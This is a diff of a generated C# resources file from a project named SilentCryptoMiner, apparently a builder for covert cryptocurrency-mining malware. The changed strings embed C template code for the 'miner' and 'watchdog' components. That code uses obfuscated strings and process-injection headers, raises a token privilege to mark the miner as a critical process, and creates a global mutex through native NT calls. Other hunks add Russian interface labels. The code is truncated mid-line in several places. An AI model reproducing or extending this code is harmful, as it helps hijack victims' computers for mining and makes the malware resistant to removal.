@@ -179,16 +179,17 @@ namespace SilentCryptoMiner.Properties {
         ///    &lt;Text Lang=&quot;sv&quot;&gt;Main&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;pl&quot;&gt;Główne&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;es&quot;&gt;Principal&lt;/Text&gt;
+        ///	&lt;Text Lang=&quot;ru&quot;&gt;Основное&lt;/Text&gt;
         ///  &lt;/Control&gt;
         ///  &lt;Control Name=&quot;tabStartup&quot;&gt;
         ///    &lt;Text Lang=&quot;en&quot;&gt;Startup&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;sv&quot;&gt;Uppstart&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;pl&quot;&gt;Start&lt;/Text&gt;
         ///    &lt;Text Lang=&quot;es&quot;&gt;Inicio&lt;/Text&gt;
+        ///	&lt;Text Lang=&quot;ru&quot;&gt;Автозапуск&lt;/Text&gt;
         ///  &lt;/Control&gt;
         ///  &lt;Control Name=&quot;tabAssembly&quot;&gt;
-        ///    &lt;Text Lang=&quot;en&quot;&gt;Assembly&lt;/Text&gt;
-        ///    &lt;Text Lang=&quot;sv&quot;&gt;Assembly&lt;/Text&gt; [rest of string was truncated]&quot;;.
+        ///    [rest of string was truncated]&quot;;.
         /// </summary>
         public static string LocalizedControls {
             get {
@@ -208,25 +209,24 @@ namespace SilentCryptoMiner.Properties {
         
         /// <summary>
         ///   Looks up a localized string similar to #include &quot;UFiles\ntddk.h&quot;
-        ///#include &lt;string&gt;
-        ///#include &lt;shlobj.h&gt;
+        ///#include &lt;wchar.h&gt;
         ///
         ///#include &quot;UFiles\utils.h&quot;
         ///#include &quot;UFiles\common.h&quot;
         ///#include &quot;UFiles\obfuscate.h&quot;
         ///#include &quot;UFiles\obfuscatew.h&quot;
-        ///#include &quot;UFiles\kernel32_undoc.h&quot;
         ///#include &quot;UFiles\Injection\inject.h&quot;
         ///$RESOURCES
         ///
-        ///BOOLEAN bl;
+        ///bool bl = false;
         ///
         ///void set_critical_process(HANDLE pHandle) {
         ///#if DefProcessProtect
-        ///    if (pHandle &gt; 0 &amp;&amp; (bl || NT_SUCCESS(UpRtlAdjustPrivilege(20, TRUE, FALSE, &amp;bl))))
-        ///    {
-        ///        ULONG breakStatus = true;
-        ///        UtSetInformation [rest of string was truncated]&quot;;.
+        ///    if (!bl) {
+        ///        TOKEN_PRIVILEGES privilege = { 1, { 0x14, 0, SE_PRIVILEGE_ENABLED } };
+        ///
+        ///        HANDLE hToken = NULL;
+        ///	    UtOpenProcessToken(UtCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_ [rest of string was truncated]&quot;;.
         /// </summary>
         public static string miner {
             get {
@@ -334,8 +334,8 @@ namespace SilentCryptoMiner.Properties {
         ///  &lt;/trustInfo&gt;
         ///  &lt;compatibility xmlns=&quot;urn:schemas-microsoft-com:compatibility.v1&quot;&gt;
         ///    &lt;application&gt;
-        ///      &lt;!--The ID below indicates application support for Windows Vista --&gt;
-        ///     [rest of string was truncated]&quot;;.
+        ///      &lt;supportedOS Id=&quot;{e2011457-1546-43c5-a5fe-008deee3d3f0}&quot;/&gt;
+        ///      &lt;support [rest of string was truncated]&quot;;.
         /// </summary>
         public static string template {
             get {
@@ -372,24 +372,25 @@ namespace SilentCryptoMiner.Properties {
         
         /// <summary>
         ///   Looks up a localized string similar to #include &quot;UFiles\ntddk.h&quot;
-        ///#include &lt;shlobj.h&gt;
+        ///#include &lt;wchar.h&gt;
         ///
         ///#include &quot;UFiles\utils.h&quot;
         ///#include &quot;UFiles\common.h&quot;
         ///#include &quot;UFiles\obfuscatew.h&quot;
-        ///#include &quot;UFiles\kernel32_undoc.h&quot;
         ///
         ///int wmain(int argc, wchar_t* argv[])
         ///{
-        ///    HANDLE hMutex = CreateMutexW(NULL, TRUE, AYW_OBFUSCATE(L&quot;Global\\#WATCHDOGID&quot;));
+        ///    HANDLE hMutex;
         ///
-        ///    load_kernel32_functions();
+        ///    wchar_t mutexTemp[MAX_PATH] = { 0 };
+        ///    wcscpy(mutexTemp, AYW_OBFUSCATE(L&quot;\\BaseNamedObjects\\#WATCHDOGID&quot;));
+        ///    UNICODE_STRING umutex;
+        ///    INIT_UNICODE_STRING(umutex, mutexTemp);
         ///
-        ///    wchar_t startupPath[MAX_PATH] = { 0 };
-        ///    SHGetFolderPathW(NULL, $BASEDIR, NULL, 0, startupPath);
-        ///    wcscat(startupPath, AYW_OBFUSCATE(L&quot;#STARTUPFILE&quot;));
+        ///    OBJECT_ATTRIBUTES attr;
+        ///    InitializeObjectAttributes(&amp;attr, &amp;umutex, 0, NULL, NULL);
         ///
-        ///    bool  [rest of string was truncated]&quot;;.
+        ///    UtCreateMutant(&amp;hMut [rest of string was truncated]&quot;;.
         /// </summary>
         public static string watchdog {
             get {
